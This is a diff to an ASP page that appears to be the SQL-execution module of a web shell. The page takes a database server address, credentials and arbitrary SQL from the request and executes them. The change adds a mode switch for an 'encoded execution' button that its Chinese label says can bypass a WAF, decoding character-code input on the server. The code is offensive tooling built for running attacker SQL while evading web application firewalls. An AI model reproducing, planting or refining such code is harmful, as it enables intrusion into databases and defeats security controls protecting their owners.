@@ -17,17 +17,18 @@ Sql_content =Trim(Request("Sql_content"))
 If Sql_linkport="" Then Sql_linkport="1433"
 
 If Sql_serverip<>"" and Sql_linkport<>"" and Sql_username<>"" and Sql_password<>"" and Sql_content<>"" Then
-
-	dim sqlarr
-	sqlarr = Split(Sql_content, "\")
-	Sql_content = ""
-	for each x in sqlarr
-		if IsNumeric(x) then
-		Sql_content = Sql_content & chr(cint(x))
-		else
-		Sql_content = Sql_content & x
-		end if
-	next
+	if Request("method")="encode" then
+		dim sqlarr
+		sqlarr = Split(Sql_content, "\")
+		Sql_content = ""
+		for each x in sqlarr
+			if IsNumeric(x) then
+			Sql_content = Sql_content & chr(cint(x))
+			else
+			Sql_content = Sql_content & x
+			end if
+		next
+	end if
 
 	Response.Write "<hr width='100%'><b>执行结果：</b><hr width='100%'>"
 	Dim SQL,conn,linkStr
@@ -179,8 +180,9 @@ function encode(s){
 			'>
 			<textarea name="Sql_content" id="sqlc" style='width:100%;height:100%;'>输入你要执行的sql语句</textarea>
 			</DIV>
+			<input type="hidden" id="method" name="method" value="common">
 			<input type="submit" value="普通执行(可能被WAF拦截)">
-			<input type="button" onclick="var a = sqlc.value;sqlc.value=encode(a);submitf.submit();sqlc.value = a;" value="编码执行(可绕过WAF)">
+			<input type="button" onclick="var a=sqlc.value;method.value='encode';sqlc.value=encode(a);submitf.submit();method.value='common';sqlc.value = a;" value="编码执行(可绕过WAF)">
 		</td>
 		</tr>
 	</table>
